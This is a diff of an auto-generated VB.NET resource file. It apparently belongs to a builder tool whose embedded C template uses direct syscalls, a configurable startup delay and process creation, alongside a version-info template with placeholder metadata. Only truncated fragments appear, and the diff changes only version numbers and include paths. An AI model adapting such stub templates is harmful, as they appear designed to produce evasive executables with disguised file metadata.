@@ -22,7 +22,7 @@ Namespace My.Resources
     '''<summary>
     '''  A strongly-typed resource class, for looking up localized strings, etc.
     '''</summary>
-    <Global.System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "16.0.0.0"),  _
+    <Global.System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "18.0.0.0"),  _
      Global.System.Diagnostics.DebuggerNonUserCodeAttribute(),  _
      Global.System.Runtime.CompilerServices.CompilerGeneratedAttribute(),  _
      Global.Microsoft.VisualBasic.HideModuleNameAttribute()>  _
@@ -163,7 +163,7 @@ Namespace My.Resources
         '''#include &lt;stdlib.h&gt;
         '''#include &lt;windows.h&gt;
         '''#include &lt;sys/types.h&gt;
-        '''#include &quot;syscalls.h&quot;
+        '''#include &quot;Includes/syscalls.h&quot;
         '''
         '''/* Created by Unam Sanctam, https://github.com/UnamSanctam */
         '''
@@ -180,7 +180,7 @@ Namespace My.Resources
         '''	Sleep(#DELAY * 1000);
         '''
         '''	PROCESS_INFORMATION p_info;
-        '''	STARTUPINFO s_info = {sizeof [rest of string was truncated]&quot;;.
+        '''	STARTUPINFO s_info  [rest of string was truncated]&quot;;.
         '''</summary>
         Friend ReadOnly Property Program1() As String
             Get
@@ -209,7 +209,7 @@ Namespace My.Resources
         '''            VALUE &quot;FileDescription&quot;, &quot;#DESCRIPTION&quot;
         '''            VALUE &quot;FileVersion&quot;, &quot;#VERSION&quot;
         '''            VALUE &quot;LegalCopyright&quot;, &quot;#COPYRIGHT&quot;
-        '''			VALUE &quot; [rest of string was truncated]&quot;;.
+        '''			VALUE &quot;LegalTrademark&quot;, &quot;#T [rest of string was truncated]&quot;;.
         '''</summary>
         Friend ReadOnly Property resource() As String
             Get
